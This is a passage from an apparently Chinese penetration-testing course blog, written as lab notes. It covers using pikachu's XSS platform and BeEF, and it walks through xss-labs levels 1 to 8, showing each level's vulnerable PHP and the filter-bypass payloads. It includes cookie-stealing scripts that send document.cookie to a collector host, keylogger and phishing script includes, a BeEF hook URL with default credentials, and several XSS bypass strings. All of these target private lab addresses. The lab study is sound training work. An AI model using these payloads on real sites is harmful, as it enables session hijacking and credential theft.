        <content type="html"><![CDATA[<h1 id="pikachu的XSS平台"><a href="#pikachu的XSS平台" class="headerlink" title="pikachu的XSS平台"></a>pikachu的XSS平台</h1><h2 id="基于反射型GET"><a href="#基于反射型GET" class="headerlink" title="基于反射型GET"></a>基于反射型GET</h2><h3 id="获取Cookie"><a href="#获取Cookie" class="headerlink" title="获取Cookie"></a>获取Cookie</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p><a href="http://192.168.70.130/pkxss/xcookie/cookie.php">http://192.168.70.130/pkxss/xcookie/cookie.php</a> </p><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><p>修改输入长度 </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://192.168.70.130/pkxss/xcookie/cookie.php/cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.70.130/vul/xss/xss_reflected_get.php?message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document.location<span class="token operator">=</span><span class="token string">'http://192.168.70.130/pkxss/xcookie/cookie.php?cookie='</span>+document.cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="基于反射型POST"><a href="#基于反射型POST" class="headerlink" title="基于反射型POST"></a>基于反射型POST</h2><p>访问地址 </p><p><a href="http://192.168.70.130/pkxss/xcookie/post.html">http://192.168.70.130/pkxss/xcookie/post.html</a></p><h2 id="基于存储型"><a href="#基于存储型" class="headerlink" title="基于存储型"></a>基于存储型</h2><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><p><a href="http://192.168.70.130/pkxss/xfish/fish.php">http://192.168.70.130/pkxss/xfish/fish.php</a> </p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"&lt;script src="</span><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.70</span><span class="token number">.130</span><span class="token operator">/</span>pkxss<span class="token operator">/</span>xfish<span class="token operator">/</span>fish<span class="token punctuation">.</span>php"<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><h4 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h4><p><a href="http://192.168.70.130/pkxss/rkeypress/rk.js">http://192.168.70.130/pkxss/rkeypress/rk.js</a> </p><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://192.168.70.130/pkxss/rkeypress/rk.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="开源XSS平台"><a href="#开源XSS平台" class="headerlink" title="开源XSS平台"></a>开源XSS平台</h1><p>源码</p><p><a href="https://github.com/78778443/xssplatform">https://github.com/78778443/xssplatform</a> </p><p>安装流程</p><p> <a href="https://mp.weixin.qq.com/s/BeTEMmTX93w4B3jThDZgYA">https://mp.weixin.qq.com/s/BeTEMmTX93w4B3jThDZgYA</a></p><h1 id="beef-xss"><a href="#beef-xss" class="headerlink" title="beef-xss"></a><strong>beef-xss</strong></h1><p>全称：The Browser Exploitation Framework</p><p><a href="https://beefproject.com/">https://beefproject.com/</a></p><p><a href="https://github.com/beefproject/beef/wiki/">https://github.com/beefproject/beef/wiki/</a></p><h2 id="安装和启动命令"><a href="#安装和启动命令" class="headerlink" title="安装和启动命令"></a>安装和启动命令</h2><pre class="line-numbers language-none"><code class="language-none">beef-xss<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h2><p><a href="http://192.168.31.76:3000/ui/panel">http://192.168.31.76:3000/ui/panel</a> </p><p><strong>用户名 :beef</strong> </p><p><strong>密码 :bebeef</strong></p><p>配置文件：/etc/beef-xss/config.yaml </p><h2 id="钩子地址"><a href="#钩子地址" class="headerlink" title="钩子地址"></a>钩子地址</h2><p><a href="http://192.168.31.76:3000/hook.js">http://192.168.31.76:3000/hook.js</a> </p><p>payload </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://192.168.31.76:3000/hook.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="Detials"><a href="#Detials" class="headerlink" title="Detials"></a>Detials</h3><p>浏览器、插件版本信息，操作系统信息 </p><h3 id="Logs"><a href="#Logs" class="headerlink" title="Logs"></a>Logs</h3><p>浏览器动作：焦点变化，鼠标单击，信息输入 </p><h3 id="commands"><a href="#commands" class="headerlink" title="commands"></a>commands</h3><ul><li>绿色模块：表示模块适用当前用户，并且执行结果对用户不可见 </li><li>红色模块：表示模块不适用当前用户，有些红色模块也可以执行 </li><li>橙色模块：模块可用，但结果对用户可见 </li><li>灰色模块：模块为在目标浏览器上测试过</li></ul><h3 id="XSS-Rays"><a href="#XSS-Rays" class="headerlink" title="XSS Rays"></a>XSS Rays</h3><p>XSS扫描工具 </p><p><a href="https://github.com/beefproject/beef/wiki/xss-ray">https://github.com/beefproject/beef/wiki/xss-ray</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-labs/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/xss-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建xss-labs"><a href="#搭建xss-labs" class="headerlink" title="搭建xss-labs"></a>搭建xss-labs</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332">https://blog.csdn.net/wo41ge/article/details/107459332</a></p><h1 id="访问靶场"><a href="#访问靶场" class="headerlink" title="访问靶场"></a>访问靶场</h1><p><a href="http://192.168.31.193:8080/">http://192.168.31.193:8080</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="http://192.168.31.193:8080/level1.php?name=test">http://192.168.31.193:8080/level1.php?name=test</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>欢迎来到level1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;欢迎用户"</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h2&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level1.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 align=center&gt;payload的长度:"</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h3&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="没有任何过滤，get型"><a href="#没有任何过滤，get型" class="headerlink" title="没有任何过滤，get型"></a>没有任何过滤，get型</h3><p><code>?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="http://192.168.31.193:8080/level2.php?keyword=test">http://192.168.31.193:8080/level2.php?keyword=test</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value="搜索"/&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一处参数输出被<strong>htmlspecialchars函数</strong>处理<br>第二处没有做过滤。</p><h3 id="测试有做了什么过滤"><a href="#测试有做了什么过滤" class="headerlink" title="测试有做了什么过滤"></a>测试有做了什么过滤</h3><p><code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\"&lt;&gt;</code></p><p>查看网页源码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>没有找到和<span class="token entity named-entity" title="<">&amp;lt;</span>sCr<span class="token entity named-entity" title="<">&amp;lt;</span>scrscRiptipt<span class="token entity named-entity" title=">">&amp;gt;</span>ipt<span class="token entity named-entity" title=">">&amp;gt;</span>OonN\<span class="token entity named-entity" title="&amp;">&amp;amp;</span>apos;\<span class="token entity named-entity" title="&quot;">&amp;quot;</span><span class="token entity named-entity" title="<">&amp;lt;</span><span class="token entity named-entity" title=">">&amp;gt;</span> 相关的结果.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\<span class="token entity named-entity" title="'">&amp;apos;</span>\<span class="token punctuation">"</span></span><span class="token attr-name">&lt;</span><span class="token punctuation">&gt;</span></span> "&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="使用-”-gt-闭合"><a href="#使用-”-gt-闭合" class="headerlink" title="使用**”>**闭合"></a>使用**”&gt;**闭合</h3><p><code>?keyword="&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;"</code></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="http://192.168.31.193:8080/level3.php?writing=wait">http://192.168.31.193:8080/level3.php?writing=wait</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value='"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="测试有做了什么过滤-1"><a href="#测试有做了什么过滤-1" class="headerlink" title="测试有做了什么过滤"></a>测试有做了什么过滤</h3><p><code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\"&lt;&gt;</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>没有找到和<span class="token entity named-entity" title="<">&amp;lt;</span>sCr<span class="token entity named-entity" title="<">&amp;lt;</span>scrscRiptipt<span class="token entity named-entity" title=">">&amp;gt;</span>ipt<span class="token entity named-entity" title=">">&amp;gt;</span>OonN\<span class="token entity named-entity" title="&amp;">&amp;amp;</span>apos;\<span class="token entity named-entity" title="&quot;">&amp;quot;</span><span class="token entity named-entity" title="<">&amp;lt;</span><span class="token entity named-entity" title=">">&amp;gt;</span>相关的结果.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level3.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>GET</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token entity named-entity" title="<">&amp;lt;</span>sCr<span class="token entity named-entity" title="<">&amp;lt;</span>scrscRiptipt<span class="token entity named-entity" title=">">&amp;gt;</span>ipt<span class="token entity named-entity" title=">">&amp;gt;</span>OonN\<span class="token entity named-entity" title="&amp;">&amp;amp;</span>apos;\<span class="token entity named-entity" title="&quot;">&amp;quot;</span><span class="token entity named-entity" title="<">&amp;lt;</span><span class="token entity named-entity" title=">">&amp;gt;</span><span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>两个输出参数的地方都有被过滤,单引号没有过滤。</p><table><thead><tr><th>&lt;</th><th><code>&amp;lt;</code></th></tr></thead><tbody><tr><td>&gt;</td><td><code>&amp;gt;</code></td></tr><tr><td>“</td><td><code>\&amp;quot;</code></td></tr></tbody></table><p>闭合value=’的单引号</p><blockquote><p>onmouseover事件会在<strong>鼠标指针移动</strong>到指定的对象上时触发事件发生。</p></blockquote><p><code>?writing=' onmouseover='alert(/xss/)'</code></p><p>移动鼠标到输入框触发xss.</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a href="http://192.168.31.193:8080/level4.php?keyword=try%20harder">http://192.168.31.193:8080/level4.php?keyword=try%20harder</a>!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str3</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将前后<strong>括号</strong>替换为空，**双引号”**闭合</p><p><code>" onmouseover="alert(/xss/)</code></p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="http://192.168.31.193:8080/level5.php?keyword=find%20a%20way%20out">http://192.168.31.193:8080/level5.php?keyword=find%20a%20way%20out</a>!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str3</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对**&lt;script和on<strong>做了加下划线处理，</strong>双引号”**闭合</p><p><strong>strtolower()函数</strong>，他会把提交的所有字符转换为<strong>小写</strong></p><p>测试做了什么处理</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>变成了 </p><p><code>&lt;scr_ipt " 'oo_nn&gt;</code></p><p>在中间加了下划线,大O变成小写了。</p><p>关键字处理一次，单引号和双引号依然存在。</p><p><code>"&gt;&lt;a href ="javascript:alert:alert(/xss/)"&gt;click&lt;/a&gt;</code></p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="http://192.168.31.193:8080/level6.php?keyword=break%20it%20out">http://192.168.31.193:8080/level6.php?keyword=break%20it%20out</a>!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"href"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str6</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对**&lt;script，on，src，data，href**做了加下划线处理。</p><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>&lt;scr_ipt “ ‘Oo_nn&gt;</p><p>和之前过滤一下。尝试之前的payload</p><p><code>"&gt;&lt;a href ="javascript:alert:alert(/xss/)"&gt;click&lt;/a&gt;</code></p><p>发现超链接被过滤</p><p><a hr_ef="javascript:alert:alert(/xss/)">click</a></p><p>尝试<strong>大小写</strong> ，<strong>hrEf</strong></p><p><code>"&gt;&lt;a hrEf ="javascript:alert:alert(/xss/)"&gt;click&lt;/a&gt;</code></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p><a href="http://192.168.31.193:8080/level7.php?keyword=move%20up">http://192.168.31.193:8080/level7.php?keyword=move%20up</a>!</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php ini_set("display_errors", 0);$str =strtolower( $_GET["keyword"]);$str2=str_replace("script","",$str);$str3=str_replace("on","",$str2);$str4=str_replace("src","",$str3);$str5=str_replace("data","",$str4);$str6=str_replace("href","",$str5);echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value="'.$str6.'"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>strtolower将传参变为小写，</p><p>script，on，src，data，href被替换为空，</p><p>尝试<strong>双写</strong> s<em>script</em>cript</p><p><code>"&gt;&lt;sscriptcript&gt; alert(/xss/)&lt;/sscriptcript&gt;</code></p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p><a href="http://192.168.31.193:8080/level8.php?keyword=nice%20try">http://192.168.31.193:8080/level8.php?keyword=nice%20try</a>!</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php ini_set("display_errors", 0);$str = strtolower($_GET["keyword"]);$str2=str_replace("script","scr_ipt",$str);$str3=str_replace("on","o_n",$str2);$str4=str_replace("src","sr_c",$str3);$str5=str_replace("data","da_ta",$str4);$str6=str_replace("href","hr_ef",$str5);$str7=str_replace('"','&amp;quot',$str6);echo '&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value="'.htmlspecialchars($str).'"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;<span aria-hidden="true" 